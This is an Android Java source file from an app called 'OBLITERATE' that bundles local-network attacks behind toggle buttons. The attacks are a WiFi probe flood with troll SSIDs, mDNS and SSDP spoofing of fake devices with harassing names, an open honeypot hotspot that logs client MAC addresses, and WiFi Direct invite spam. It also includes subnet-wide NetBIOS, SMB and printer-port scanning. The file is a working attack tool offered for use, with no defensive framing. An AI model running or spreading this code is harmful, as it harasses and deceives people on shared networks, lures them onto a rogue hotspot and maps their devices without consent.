package com.obliterate.btspam;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Typeface;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.p2p.*;
import android.os.*;
import android.text.method.ScrollingMovementMethod;
import android.view.*;
import android.widget.*;

import java.io.*;
import java.net.*;
import java.util.*;

/**
 * OBLITERATE Network Attacks — Probe Flood, mDNS, SSDP, Hotspot, LAN Scan, Net Enum.
 * All WiFi/network phone-native attacks in one page.
 */
public class NetworkActivity extends Activity {

    // ── WiFi ──────────────────────────────────
    private WifiManager wifiManager;
    private volatile boolean isProbeFlood = false, isMdnsSpoof = false, isSsdpSpoof = false, isHoneypot = false;
    private int probeFloodNetId = -1;

    // ── WiFi Direct ────────────────────────────
    private WifiP2pManager wifiP2pManager;
    private WifiP2pManager.Channel wifiChannel;
    private volatile boolean isWifiSpam = false;
    private final ArrayList<WifiP2pDevice> wifiPeers = new ArrayList<>();

    // ── Net Enum ───────────────────────────────
    private volatile boolean stopNetScan = false;

    // ── UI ─────────────────────────────────────
    private TextView statusText, logText;
    private EditText spoofNameInput, subnetInput;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private PowerManager.WakeLock wakeLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        initWifiDirect();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OB:NetAtk");
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        buildUI();
        log("╔══════════════════════════════════╗");
        log("║  OBLITERATE NETWORK ATTACKS     ║");
        log("║  Probe · mDNS · SSDP · Hotspot  ║");
        log("║  LAN Scan · Net Enum · WiFi Dir ║");
        log("╚══════════════════════════════════╝");
        log("  Network attacks armed.");
    }

    @Override
    protected void onDestroy() {
        stopAll();
        mainHandler.removeCallbacksAndMessages(null);
        try { unregisterReceiver(mWifiReceiver); } catch (Exception e) {}
        super.onDestroy();
    }

    // ═══════════════════════════════════════════
    //  WIFI DIRECT INIT
    // ═══════════════════════════════════════════

    private void initWifiDirect() {
        wifiP2pManager = (WifiP2pManager) getSystemService(Context.WIFI_P2P_SERVICE);
        if (wifiP2pManager == null) return;
        wifiChannel = wifiP2pManager.initialize(this, getMainLooper(), null);
        IntentFilter f = new IntentFilter();
        f.addAction(WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION);
        f.addAction(WifiP2pManager.WIFI_P2P_CONNECTION_CHANGED_ACTION);
        f.addAction(WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION);
        registerReceiver(mWifiReceiver, f);
    }

    // ═══════════════════════════════════════════
    //  UI
    // ═══════════════════════════════════════════

    private void buildUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0A0A0A);
        root.setPadding(12, 48, 12, 20);

        root.addView(mkLabel("🌐  NETWORK ATTACKS", 0xFFFF2222, 22));
        root.addView(mkLabel("[ probe flood · mdns · ssdp · hotspot · lan · net enum ]", 0xFF888888, 9));

        statusText = mkLabel("⚫ READY", 0xFF00FF41, 13);
        statusText.setPadding(0, 10, 0, 4);
        root.addView(statusText);

        // Spoof name
        root.addView(mkLabel("SPOOF DEVICE NAME:", 0xFFFFCC00, 9));
        spoofNameInput = mkEdit("📱 iPhone 15 Pro");
        root.addView(spoofNameInput);

        // Row 1: Probe Flood + BT Turbo placeholder
        LinearLayout r1 = new LinearLayout(this); r1.setOrientation(LinearLayout.HORIZONTAL);
        r1.addView(mkToggleBtn("📡 PROBE FLOOD", "isProbeFlood"));
        r1.addView(mkToggleBtn("🌐 mDNS SPOOF", "isMdnsSpoof"));
        root.addView(r1);

        // Row 2: SSDP + Hotspot
        LinearLayout r2 = new LinearLayout(this); r2.setOrientation(LinearLayout.HORIZONTAL);
        r2.addView(mkToggleBtn("📺 SSDP SPOOF", "isSsdpSpoof"));
        r2.addView(mkToggleBtn("📶 HONEYPOT", "isHoneypot"));
        root.addView(r2);

        // Row 3: WiFi Direct Spam
        LinearLayout r3 = new LinearLayout(this); r3.setOrientation(LinearLayout.HORIZONTAL);
        r3.addView(mkToggleBtn("📡 WIFI DIRECT", "isWifiSpam"));
        root.addView(r3);

        // Row 4: LAN Scan + Net Enum
        root.addView(mkLabel("NETWORK RECON:", 0xFFFFCC00, 9));
        LinearLayout r4 = new LinearLayout(this); r4.setOrientation(LinearLayout.HORIZONTAL);
        r4.addView(mkActionBtn("🖧 LAN SCAN", "scanLan"));
        r4.addView(mkActionBtn("💻 NETBIOS", "scanNetbios"));
        r4.addView(mkActionBtn("📁 SMB", "scanSmb"));
        root.addView(r4);

        // Row 5: Printers + Scan All
        LinearLayout r5 = new LinearLayout(this); r5.setOrientation(LinearLayout.HORIZONTAL);
        r5.addView(mkActionBtn("🖨 PRINTERS", "scanPrinters"));
        r5.addView(mkActionBtn("🔍 SCAN ALL", "scanAll"));
        root.addView(r5);

        // Subnet input
        subnetInput = mkEdit("192.168.1");
        subnetInput.setHint("Subnet prefix");
        subnetInput.setTextSize(11);
        root.addView(subnetInput);

        // Row 6: Stop All + Back
        LinearLayout r6 = new LinearLayout(this); r6.setOrientation(LinearLayout.HORIZONTAL);
        Button btnStop = mkBtnWide("🛑 STOP ALL");
        btnStop.setBackgroundColor(0xFF8B0000);
        btnStop.setOnClickListener(new View.OnClickListener() { public void onClick(View v) { stopAll(); }});
        r6.addView(btnStop);
        Button btnBack = mkBtnWide("← BACK");
        btnBack.setOnClickListener(new View.OnClickListener() { public void onClick(View v) { finish(); }});
        r6.addView(btnBack);
        root.addView(r6);

        // Log
        root.addView(mkLabel("TERMINAL:", 0xFF888888, 9));
        logText = new TextView(this);
        logText.setTextColor(0xFF00FF41); logText.setTextSize(10); logText.setTypeface(Typeface.MONOSPACE);
        logText.setBackgroundColor(0xFF0D0D0D); logText.setPadding(6, 6, 6, 6);
        logText.setMovementMethod(new ScrollingMovementMethod());
        logText.setHorizontallyScrolling(true); logText.setTextIsSelectable(true);
        logText.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(180)));
        root.addView(logText);

        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(0xFF0A0A0A); sv.addView(root); sv.setFillViewport(true);
        setContentView(sv);
    }

    private Button mkToggleBtn(String label, final String field) {
        final Button b = mkBtnWide(label);
        b.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            boolean state = false;
            try { state = NetworkActivity.class.getDeclaredField(field).getBoolean(NetworkActivity.this); } catch (Exception e) {}
            if (state) {
                try { NetworkActivity.class.getDeclaredField(field).setBoolean(NetworkActivity.this, false); } catch (Exception e) {}
                resetBtn(b, label);
                log("🛑 " + label + " stopped");
                updateStatus("READY");
                releaseLock();
                // Stop specific attacks
                if (field.equals("isProbeFlood") && probeFloodNetId >= 0) {
                    try { wifiManager.removeNetwork(probeFloodNetId); probeFloodNetId = -1; } catch (Exception e) {}
                }
            } else {
                if (!wifiConnected()) { log("✕ Connect to WiFi first"); return; }
                try { NetworkActivity.class.getDeclaredField(field).setBoolean(NetworkActivity.this, true); } catch (Exception e) {}
                setBtnOn(b, label + " ON");
                log("⚡ " + label + " ENGAGED");
                updateStatus(label);
                acquireLock();
                // Launch runner
                if (field.equals("isProbeFlood")) new Thread(new ProbeFloodRunner()).start();
                else if (field.equals("isMdnsSpoof")) new Thread(new MdnsSpooferRunner()).start();
                else if (field.equals("isSsdpSpoof")) new Thread(new SsdpSpooferRunner()).start();
                else if (field.equals("isHoneypot")) new Thread(new HotspotHoneypotRunner()).start();
                else if (field.equals("isWifiSpam")) startWifiSpam();
            }
        }});
        return b;
    }

    private Button mkActionBtn(String label, final String action) {
        Button b = mkBtnWide(label);
        b.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            try { NetworkActivity.class.getDeclaredMethod(action).invoke(NetworkActivity.this); } catch (Exception e) { log("✕ " + e.getMessage()); }
        }});
        return b;
    }

    // ═══════════════════════════════════════════
    //  WIFI PROBE FLOOD
    // ═══════════════════════════════════════════

    private class ProbeFloodRunner implements Runnable {
        public void run() {
            final String[] trollSSIDs = {
                "FBI_Surveillance_Van", "NSA_Listening_Post_7", "CIA_Field_Office",
                "Police_Drone_42", "Homeland_Security_Drone", "Secret_Service_Detail",
                "Interpol_Mobile_Unit", "DEA_Monitoring", "Military_Police_Air",
                "Apple_Internal_Test", "Google_Data_Collection", "Microsoft_Security_Audit",
                "Your_Location_Tracked", "Microphone_Active", "Camera_Remote_Access",
                "This_Device_Infected", "You_Are_Watched", "Free_WiFi_No_Pass",
            };
            int idx = 0; int count = 0;
            while (isProbeFlood) {
                final String ssid = trollSSIDs[idx % trollSSIDs.length] + "_" + (idx % 999); idx++;
                try {
                    if (probeFloodNetId >= 0) { wifiManager.removeNetwork(probeFloodNetId); probeFloodNetId = -1; }
                    WifiConfiguration wc = new WifiConfiguration();
                    wc.SSID = "\"" + ssid + "\"";
                    wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                    probeFloodNetId = wifiManager.addNetwork(wc);
                    if (probeFloodNetId >= 0) { wifiManager.enableNetwork(probeFloodNetId, false); wifiManager.saveConfiguration(); }
                } catch (Exception e) {}
                try { wifiManager.startScan(); } catch (Exception e) {}
                count++;
                if (count % 10 == 0) {
                    final int c = count; final String s = ssid;
                    mainHandler.post(new Runnable() { public void run() {
                        log("  📡 Probe #" + c + ": \"" + s + "\"");
                        updateStatus("PROBE: " + s.substring(0, Math.min(14, s.length())));
                    }});
                }
                try { Thread.sleep(200); } catch (InterruptedException e) { break; }
            }
            if (probeFloodNetId >= 0) { try { wifiManager.removeNetwork(probeFloodNetId); probeFloodNetId = -1; } catch (Exception e) {} }
            final int sent = count;
            mainHandler.post(new Runnable() { public void run() { log("📡 Probe flood stopped — " + sent + " probes"); updateStatus("READY"); }});
            releaseLock();
        }
    }

    // ═══════════════════════════════════════════
    //  mDNS SPOOFER
    // ═══════════════════════════════════════════

    private class MdnsSpooferRunner implements Runnable {
        public void run() {
            final String[][] devs = {
                {"FBI-Surveillance-Van-3.local","192.168.1.50","_airplay._tcp.local:_raop._tcp.local"},
                {"NSA-Listening-Post.local","192.168.1.51","_printer._tcp.local:_http._tcp.local"},
                {"Samsung-Fridge-5G.local","192.168.1.52","_googlecast._tcp.local"},
                {"Karens-CCTV-CAM-4.local","192.168.1.53","_rtsp._tcp.local:_http._tcp.local"},
                {"You-Are-Watched.local","192.168.1.54","_airplay._tcp.local:_googlecast._tcp.local"},
                {"Skynet-Dev-Node.local","192.168.1.55","_ssh._tcp.local:_telnet._tcp.local"},
                {"Mom-Vibrator-Pro.local","192.168.1.56","_airplay._tcp.local:_spotify-connect._tcp.local"},
                {"Not-A-Bomb.local","192.168.1.57","_airport._tcp.local:_tftp._tcp.local"},
            };
            Random rng = new Random(); MulticastSocket sock = null; int burst = 0;
            try {
                sock = new MulticastSocket(); sock.setTimeToLive(255);
                InetAddress group = InetAddress.getByName("224.0.0.251");
                String lip = getLocalIpStr();
                while (isMdnsSpoof) { burst++;
                    int pick = 2 + rng.nextInt(3);
                    ArrayList<Integer> idxs = new ArrayList<>();
                    while (idxs.size() < pick) { int r = rng.nextInt(devs.length); if (!idxs.contains(r)) idxs.add(r); }
                    for (int idx : idxs) {
                        String[] dev = devs[idx];
                        byte[] packet = buildMdnsPacket(dev[0], dev[1], dev[2].split(":"), rng);
                        DatagramPacket dp = new DatagramPacket(packet, packet.length, group, 5353);
                        for (int s = 0; s < 3; s++) { sock.send(dp); Thread.sleep(80); }
                        final String name = dev[0]; final int b = burst;
                        mainHandler.post(new Runnable() { public void run() { log("  🌐 [" + b + "] " + name); }});
                    }
                    final int b = burst;
                    mainHandler.post(new Runnable() { public void run() { updateStatus("mDNS #" + b); }});
                    Thread.sleep(10000);
                }
            } catch (Exception e) { final String m = e.getMessage(); mainHandler.post(new Runnable() { public void run() { log("✕ mDNS: " + m); }}); }
            finally { if (sock != null) sock.close(); }
            final int b = burst;
            mainHandler.post(new Runnable() { public void run() { log("🌐 mDNS stopped — " + b + " bursts"); updateStatus("READY"); }});
            releaseLock();
        }
    }

    // ═══════════════════════════════════════════
    //  SSDP SPOOFER
    // ═══════════════════════════════════════════

    private class SsdpSpooferRunner implements Runnable {
        public void run() {
            final String[][] devs = {
                {"uuid:FBI-Surveillance","upnp:rootdevice","FBI-SVR/1.0 UPnP/1.0","http://192.168.1.100:5000/root.xml","FBI Van"},
                {"uuid:Samsung-Fridge","urn:schemas-upnp-org:device:InternetGatewayDevice:1","Samsung/1.0","http://192.168.1.100:8080/desc.xml","Samsung Fridge"},
                {"uuid:NSA-Media","urn:schemas-upnp-org:device:MediaRenderer:1","NSA-PR/1.0","http://192.168.1.100:9000/device.xml","NSA Media"},
                {"uuid:Karen-CCTV","urn:schemas-upnp-org:device:DigitalSecurityCamera:1","Hikvision/5.5","http://192.168.1.100:554/desc.xml","CCTV Camera"},
                {"uuid:INFECTED-Printer","urn:schemas-upnp-org:device:Printer:1","HP-LaserJet/1.0","http://192.168.1.100:631/root.xml","INFECTED Printer"},
                {"uuid:Skynet-Dev","urn:schemas-upnp-org:device:MediaServer:1","Skynet/3.0","http://192.168.1.100:8200/root.xml","Skynet"},
                {"uuid:OnlyFans-Router","urn:schemas-upnp-org:device:WANConnectionDevice:1","Router/1.0","http://192.168.1.100:80/device.xml","OnlyFans Router"},
                {"uuid:Mom-Vibrator","urn:schemas-upnp-org:device:BinaryLight:1","Lovense/2.0","http://192.168.1.100:9999/device.xml","Mom Vibrator"},
            };
            Random rng = new Random(); MulticastSocket sock = null; int burst = 0;
            try {
                sock = new MulticastSocket(); sock.setTimeToLive(4);
                InetAddress group = InetAddress.getByName("239.255.255.250");
                String lip = getLocalIpStr();
                while (isSsdpSpoof) { burst++;
                    int pick = 3 + rng.nextInt(3);
                    ArrayList<Integer> idxs = new ArrayList<>();
                    while (idxs.size() < pick) { int r = rng.nextInt(devs.length); if (!idxs.contains(r)) idxs.add(r); }
                    for (int idx : idxs) {
                        String[] dev = devs[idx];
                        String msg = "NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n" +
                            "CACHE-CONTROL: max-age=1800\r\nLOCATION: " + dev[3].replace("192.168.1.100", lip) + "\r\n" +
                            "NT: " + dev[1] + "\r\nNTS: ssdp:alive\r\nSERVER: " + dev[2] + "\r\n" +
                            "USN: " + dev[0] + "\r\n\r\n";
                        byte[] data = msg.getBytes();
                        DatagramPacket dp = new DatagramPacket(data, data.length, group, 1900);
                        for (int s = 0; s < 2; s++) { sock.send(dp); Thread.sleep(80); }
                        final String name = dev[4]; final int b = burst;
                        mainHandler.post(new Runnable() { public void run() { log("  📺 [" + b + "] " + name); }});
                    }
                    final int b = burst;
                    mainHandler.post(new Runnable() { public void run() { updateStatus("SSDP #" + b); }});
                    Thread.sleep(30000);
                }
                for (String[] dev : devs) {
                    String bye = "NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nNT: " + dev[1] + "\r\nNTS: ssdp:byebye\r\nUSN: " + dev[0] + "\r\n\r\n";
                    sock.send(new DatagramPacket(bye.getBytes(), bye.length(), group, 1900));
                }
            } catch (Exception e) { final String m = e.getMessage(); mainHandler.post(new Runnable() { public void run() { log("✕ SSDP: " + m); }}); }
            finally { if (sock != null) sock.close(); }
            final int b = burst;
            mainHandler.post(new Runnable() { public void run() { log("📺 SSDP stopped — " + b + " bursts"); updateStatus("READY"); }});
            releaseLock();
        }
    }

    // ═══════════════════════════════════════════
    //  WIFI HONEYPOT
    // ═══════════════════════════════════════════

    private class HotspotHoneypotRunner implements Runnable {
        public void run() {
            try {
                java.lang.reflect.Method m = wifiManager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
                WifiConfiguration cfg = new WifiConfiguration();
                cfg.SSID = "\"Free_WiFi_No_Pass\"";
                cfg.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                m.invoke(wifiManager, cfg, true);
                mainHandler.post(new Runnable() { public void run() {
                    log("📶 Hotspot ON: \"Free_WiFi_No_Pass\"");
                    log("  Monitoring for curious devices...");
                }});
                int prev = 0;
                while (isHoneypot) {
                    Thread.sleep(5000);
                    BufferedReader br = new BufferedReader(new FileReader("/proc/net/arp"));
                    br.readLine();
                    String line; final ArrayList<String> clients = new ArrayList<>();
                    while ((line = br.readLine()) != null) {
                        String[] p = line.trim().split("\\s+");
                        if (p.length >= 4) {
                            String mac = p[3];
                            if (!mac.equals("00:00:00:00:00:00") && mac.contains(":")) {
                                String v = getMacVendor(mac);
                                clients.add(p[0] + " " + mac + (v != null ? " [" + v + "]" : ""));
                            }
                        }
                    }
                    br.close();
                    if (clients.size() != prev) { prev = clients.size();
                        final int c = clients.size();
                        mainHandler.post(new Runnable() { public void run() {
                            log("  📶 Clients: " + c);
                            for (String cl : clients) log("    " + cl);
                            updateStatus("HONEYPOT: " + c + " clients");
                        }});
                    }
                }
                m.invoke(wifiManager, cfg, false);
            } catch (Exception e) {
                isHoneypot = false;
                final String msg = e.getMessage();
                mainHandler.post(new Runnable() { public void run() {
                    log("✕ Hotspot: " + (msg != null ? msg : "API blocked"));
                    updateStatus("READY");
                }});
            }
            releaseLock();
        }
    }

    // ═══════════════════════════════════════════
    //  WIFI DIRECT SPAM
    // ═══════════════════════════════════════════

    private void startWifiSpam() {
        if (wifiP2pManager == null || wifiChannel == null) { log("✕ No WiFi Direct"); isWifiSpam = false; return; }
        try {
            wifiP2pManager.discoverPeers(wifiChannel, new WifiP2pManager.ActionListener() {
                public void onSuccess() { log("  ✓ WiFi Direct discovery started"); }
                public void onFailure(int code) { log("  ⚠ WiFi discovery failed: " + code); }
            });
        } catch (Exception e) { log("  ✕ WiFi: " + e.getMessage()); }
        if (isWifiSpam) {
            mainHandler.postDelayed(new Runnable() { public void run() { if (isWifiSpam) startWifiSpam(); }}, 10000);
        }
    }

    private BroadcastReceiver mWifiReceiver = new BroadcastReceiver() {
        public void onReceive(Context c, Intent i) {
            String a = i.getAction();
            if (WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION.equals(a) && isWifiSpam && wifiP2pManager != null && wifiChannel != null) {
                try {
                    wifiP2pManager.requestPeers(wifiChannel, new WifiP2pManager.PeerListListener() {
                        public void onPeersAvailable(WifiP2pDeviceList peers) {
                            wifiPeers.clear(); wifiPeers.addAll(peers.getDeviceList());
                            log("  📡 WiFi peers: " + wifiPeers.size());
                            for (WifiP2pDevice p : wifiPeers) {
                                log("     " + (p.deviceName != null ? p.deviceName : p.deviceAddress));
                                try {
                                    WifiP2pConfig cfg = new WifiP2pConfig();
                                    cfg.deviceAddress = p.deviceAddress;
                                    wifiP2pManager.connect(wifiChannel, cfg, new WifiP2pManager.ActionListener() {
                                        public void onSuccess() { log("  📩 Invite sent → " + p.deviceAddress); }
                                        public void onFailure(int code) {}
                                    });
                                } catch (Exception e) {}
                            }
                        }
                    });
                } catch (Exception e) {}
            }
        }
    };

    // ═══════════════════════════════════════════
    //  NETWORK ENUMERATION
    // ═══════════════════════════════════════════

    private void scanLan() {
        log("🖧 Scanning LAN via ARP..."); updateStatus("LAN SCAN");
        new Thread(new Runnable() { public void run() {
            try {
                BufferedReader br = new BufferedReader(new FileReader("/proc/net/arp"));
                String line; int count = 0; br.readLine();
                final StringBuilder sb = new StringBuilder("🖧 LAN DEVICES:\n");
                while ((line = br.readLine()) != null) {
                    String[] p = line.trim().split("\\s+");
                    if (p.length >= 4) {
                        String mac = p[3];
                        if (!mac.equals("00:00:00:00:00:00") && mac.contains(":")) {
                            count++;
                            String v = getMacVendor(mac);
                            sb.append("  ").append(p[0]).append("  ").append(mac);
                            if (v != null) sb.append("  [").append(v).append("]");
                            sb.append("\n");
                        }
                    }
                }
                br.close();
                sb.append("  Total: ").append(count).append(" devices\n");
                final String result = sb.toString();
                mainHandler.post(new Runnable() { public void run() { log(result); updateStatus("READY"); }});
            } catch (Exception e) { mainHandler.post(new Runnable() { public void run() { log("✕ " + e.getMessage()); updateStatus("READY"); }}); }
        }}).start();
    }

    private void scanNetbios() {
        log("🔍 NetBIOS scan..."); stopNetScan = false; updateStatus("NETBIOS");
        final String prefix = getSubnetPrefix();
        new Thread(new Runnable() { public void run() {
            for (int i = 1; i <= 254 && !stopNetScan; i++) {
                final String ip = prefix + "." + i;
                try {
                    DatagramSocket ds = new DatagramSocket(); ds.setSoTimeout(400);
                    byte[] nb = new byte[50];
                    nb[0]=(byte)0x82; nb[1]=0x28; nb[5]=1; nb[45]=0x20; nb[46]=0x43; nb[47]=0x4B;
                    DatagramPacket dp = new DatagramPacket(nb, 50, InetAddress.getByName(ip), 137);
                    ds.send(dp); ds.receive(dp);
                    if(dp.getLength()>0){
                        final String d = new String(dp.getData(),0,dp.getLength(),"ASCII").replaceAll("[^\\x20-\\x7E]",".");
                        mainHandler.post(new Runnable(){public void run(){log("  💻 "+ip+" "+d.substring(0,Math.min(40,d.length())));}});
                    }
                    ds.close();
                } catch (Exception e) {}
            }
            mainHandler.post(new Runnable(){public void run(){log("✅ NetBIOS done"); updateStatus("READY");}});
        }}).start();
    }

    private void scanSmb() {
        log("📁 SMB scan..."); stopNetScan = false; updateStatus("SMB");
        final String prefix = getSubnetPrefix();
        new Thread(new Runnable() { public void run() {
            for (int i = 1; i <= 254 && !stopNetScan; i++) {
                final String ip = prefix + "." + i;
                try {
                    Socket s = new Socket(); s.connect(new InetSocketAddress(ip,445),600);
                    byte[] smb={0x00,0x00,0x00,(byte)0xA4,(byte)0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,(byte)0xC8,0x00,0x26,(byte)0xFE,(byte)0xFE,(byte)0xFE,(byte)0xFE,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
                    OutputStream os = s.getOutputStream();
                    os.write(smb); os.flush();
                    byte[] resp = new byte[512]; int len = s.getInputStream().read(resp);
                    if(len>0){ String d=""; for(int j=40;j<len;j++){if(resp[j]>=32&&resp[j]<127)d+=(char)resp[j];else if(resp[j]==0)d+=" ";}
                        final String r = "  📁 "+ip+" "+d.trim();
                        mainHandler.post(new Runnable(){public void run(){log(r);}});
                    }
                    s.close();
                } catch (Exception e) {}
            }
            mainHandler.post(new Runnable(){public void run(){log("✅ SMB done"); updateStatus("READY");}});
        }}).start();
    }

    private void scanPrinters() {
        log("🖨 Printer scan..."); stopNetScan = false; updateStatus("PRINTERS");
        final String prefix = getSubnetPrefix();
        new Thread(new Runnable() { public void run() {
            int[] ports={9100,515,631,80,443,8080};
            for (int i = 1; i <= 254 && !stopNetScan; i++) {
                final String ip = prefix + "." + i;
                for (int p = 0; p < ports.length; p++) {
                    try { Socket s = new Socket(); s.connect(new InetSocketAddress(ip,ports[p]),500); s.close();
                        final String r = "  🖨 "+ip+":"+ports[p];
                        mainHandler.post(new Runnable(){public void run(){log(r);}});
                    } catch (Exception e) {}
                }
            }
            mainHandler.post(new Runnable(){public void run(){log("✅ Printers done"); updateStatus("READY");}});
        }}).start();
    }

    private void scanAll() {
        log("🔍 Full network enum..."); stopNetScan = false; scanNetbios();
        new Thread(new Runnable(){public void run(){
            try{Thread.sleep(3000);}catch(Exception e){}
            if (!stopNetScan) scanSmb();
            try{Thread.sleep(3000);}catch(Exception e){}
            if (!stopNetScan) scanPrinters();
        }}).start();
    }

    private String getSubnetPrefix() {
        try { if (subnetInput != null && subnetInput.getText().length() > 0 && subnetInput.getText().toString().matches("\\d+\\.\\d+\\.\\d+")) return subnetInput.getText().toString().trim(); } catch (Exception e) {}
        return getLocalIpStr().substring(0, getLocalIpStr().lastIndexOf('.'));
    }

    // ═══════════════════════════════════════════
    //  mDNS PACKET BUILDER
    // ═══════════════════════════════════════════

    private byte[] buildMdnsPacket(String host, String ip, String[] svcs, Random rng) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            w16(baos, rng.nextInt(0xFFFF)); w16(baos, 0x8400);
            w16(baos, 0); w16(baos, 1 + svcs.length); w16(baos, 0); w16(baos, 0);
            byte[] he = dnsName(host); baos.write(he); w16(baos, 1); w16(baos, 1); w32(baos, 120); w16(baos, 4);
            for (String p : ip.split("\\.")) baos.write(Integer.parseInt(p));
            for (String s : svcs) {
                byte[] se = dnsName(s); baos.write(se); w16(baos, 12); w16(baos, 1); w32(baos, 120);
                byte[] te = dnsName(host); w16(baos, te.length); baos.write(te);
            }
        } catch (Exception e) {}
        return baos.toByteArray();
    }

    private byte[] dnsName(String n) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        for (String p : n.split("\\.")) { byte[] b = p.getBytes(); baos.write(b.length); try { baos.write(b); } catch (Exception e) {} }
        baos.write(0); return baos.toByteArray();
    }

    private void w16(ByteArrayOutputStream b, int v) { b.write((v>>8)&0xFF); b.write(v&0xFF); }
    private void w32(ByteArrayOutputStream b, long v) { b.write((int)((v>>24)&0xFF)); b.write((int)((v>>16)&0xFF)); b.write((int)((v>>8)&0xFF)); b.write((int)(v&0xFF)); }

    // ═══════════════════════════════════════════
    //  STOP ALL
    // ═══════════════════════════════════════════

    private void stopAll() {
        isProbeFlood = false; isMdnsSpoof = false; isSsdpSpoof = false; isHoneypot = false; isWifiSpam = false;
        stopNetScan = true;
        if (wifiP2pManager != null && wifiChannel != null) try { wifiP2pManager.stopPeerDiscovery(wifiChannel, null); } catch (Exception e) {}
        if (probeFloodNetId >= 0) { try { wifiManager.removeNetwork(probeFloodNetId); probeFloodNetId = -1; } catch (Exception e) {} }
        releaseLock();
        updateStatus("READY");
        log("🛑 ALL STOPPED");
    }

    // ═══════════════════════════════════════════
    //  UTILITY
    // ═══════════════════════════════════════════

    private boolean wifiConnected() {
        try { WifiInfo info = wifiManager.getConnectionInfo(); return info != null && info.getNetworkId() != -1; } catch (Exception e) { return false; }
    }

    private String getLocalIpStr() {
        try { int ip = wifiManager.getConnectionInfo().getIpAddress(); return (ip&0xFF)+"."+((ip>>8)&0xFF)+"."+((ip>>16)&0xFF)+"."+((ip>>24)&0xFF); } catch (Exception e) { return "192.168.1.80"; }
    }

    private String getMacVendor(String mac) {
        if (mac.startsWith("00:1A")||mac.startsWith("F0:DB")) return "Apple";
        if (mac.startsWith("F4:0F")||mac.startsWith("D0:57")) return "Samsung";
        if (mac.startsWith("08:00")||mac.startsWith("00:E0")) return "Intel";
        if (mac.startsWith("F0:18")||mac.startsWith("24:0A")) return "Espressif";
        if (mac.startsWith("70:B3")||mac.startsWith("E4:5F")) return "Google";
        if (mac.startsWith("B8:27")) return "RaspberryPi";
        if (mac.startsWith("28:6C")||mac.startsWith("C8:3A")) return "TP-Link";
        if (mac.startsWith("04:92")) return "Xiaomi";
        if (mac.startsWith("0C:2E")) return "Huawei";
        if (mac.startsWith("D8:1B")) return "Sony";
        if (mac.startsWith("B4:8A")) return "LG";
        if (mac.startsWith("7C:DB")) return "Amazon";
        if (mac.startsWith("34:29")) return "Ring";
        if (mac.startsWith("40:5B")) return "Nest";
        return null;
    }

    private void updateStatus(String s) {
        mainHandler.post(new Runnable() { public void run() { statusText.setText("⚡ " + s); }});
    }

    private void log(final String m) {
        mainHandler.post(new Runnable() { public void run() {
            if (logText != null) {
                logText.append(m + "\n");
                int scroll = logText.getLayout() != null
                    ? logText.getLayout().getLineTop(logText.getLineCount()) - logText.getHeight() : 0;
                if (scroll > 0) logText.scrollTo(0, scroll);
            }
        }});
    }

    private void acquireLock() {
        if (wakeLock != null && !wakeLock.isHeld()) wakeLock.acquire(10 * 60 * 1000L);
    }

    private void releaseLock() {
        if (!isProbeFlood && !isMdnsSpoof && !isSsdpSpoof && !isHoneypot && !isWifiSpam) {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        }
    }

    private void setBtnOn(Button b, String t) { b.setText(t); b.setTextColor(0xFF00FF41); }
    private void resetBtn(Button b, String t) { b.setText(t); b.setTextColor(0xFFFF2222); }

    private int dp(int px) { return (int)(px * getResources().getDisplayMetrics().density); }

    private TextView mkLabel(String t, int c, int s) {
        TextView tv = new TextView(this);
        tv.setText(t); tv.setTextColor(c); tv.setTextSize(s);
        tv.setTypeface(Typeface.MONOSPACE); tv.setPadding(0, 6, 0, 2);
        return tv;
    }

    private EditText mkEdit(String t) {
        EditText e = new EditText(this);
        e.setText(t); e.setTextColor(0xFFE0E0E0); e.setBackgroundColor(0xFF1A1A1A);
        e.setTypeface(Typeface.MONOSPACE); e.setPadding(12, 10, 12, 10);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        p.setMargins(0, 4, 0, 8); e.setLayoutParams(p);
        return e;
    }

    private Button mkBtnWide(String t) {
        Button b = new Button(this);
        b.setText(t); b.setTextColor(0xFFFF2222); b.setBackgroundColor(0xFF1A1A1A);
        b.setTypeface(Typeface.MONOSPACE); b.setTextSize(10); b.setAllCaps(true);
        b.setPadding(6, 14, 6, 14); b.setSingleLine(true);
        b.setEllipsize(android.text.TextUtils.TruncateAt.END);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(
            0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        p.setMargins(3, 5, 3, 5); b.setLayoutParams(p);
        return b;
    }
}
